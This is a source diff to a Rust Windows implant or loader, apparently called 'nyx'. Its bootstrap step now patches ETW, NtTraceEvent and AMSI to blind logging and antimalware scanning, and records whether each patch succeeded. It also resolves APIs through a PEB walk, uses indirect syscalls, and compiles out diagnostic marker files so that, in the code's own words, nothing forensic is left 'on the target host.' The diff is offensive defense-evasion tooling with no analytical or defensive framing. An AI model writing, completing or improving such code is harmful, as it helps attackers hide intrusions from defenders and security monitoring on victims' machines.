@@ -154,9 +154,16 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         hwbp_ok = etw_slot.is_ok();
     }
     if !hwbp_ok {
-        let _ = crate::blind::patch_etw();
-        let _ = crate::blind::patch_nt_trace_event();
-        let _ = crate::blind::patch_amsi();
+        let etw_r = crate::blind::patch_etw();
+        let nt_r  = crate::blind::patch_nt_trace_event();
+        let amsi_r = crate::blind::patch_amsi();
+        let all_ok = etw_r.is_ok() && nt_r.is_ok() && amsi_r.is_ok();
+        crate::blind::BLIND_OK.store(all_ok, core::sync::atomic::Ordering::Release);
+        if !all_ok {
+            unsafe { crate::blind::BLIND_ERR = etw_r.err().or(nt_r.err()).or(amsi_r.err()); }
+        }
+    } else {
+        crate::blind::BLIND_OK.store(true, core::sync::atomic::Ordering::Release);
     }
     diag_mark(b"6_blind_done");
 
@@ -288,6 +295,7 @@ unsafe fn exit_in_entry(code: u32) -> ! {
     }
 }
 
+#[cfg(nyx_diag)]
 /// Diagnostic: write a marker file `C:\nyx\diag_<mark>` so we can see which
 /// bootstrap step was reached before a crash. Uses CreateFileA/WriteFile
 /// resolved via PEB walk (no std fs). Best-effort — silently ignores errors.
@@ -341,6 +349,13 @@ pub fn diag_mark(mark: &[u8]) {
         write(h, data.as_ptr(), data.len() as u32, &mut written, core::ptr::null_mut());
         close(h);
     }
+}
+
+// Production builds ship without --cfg nyx_diag, so diag_mark is a compile-time
+// no-op that leaves no forensic marker file on the target host.
+#[cfg(not(nyx_diag))]
+pub fn diag_mark(_mark: &[u8]) {
+    // no-op: diagnostic markers are disabled in production builds
 }
 
 /// **Integration-test entry**: resolves ntdll + primes the indirect-syscall
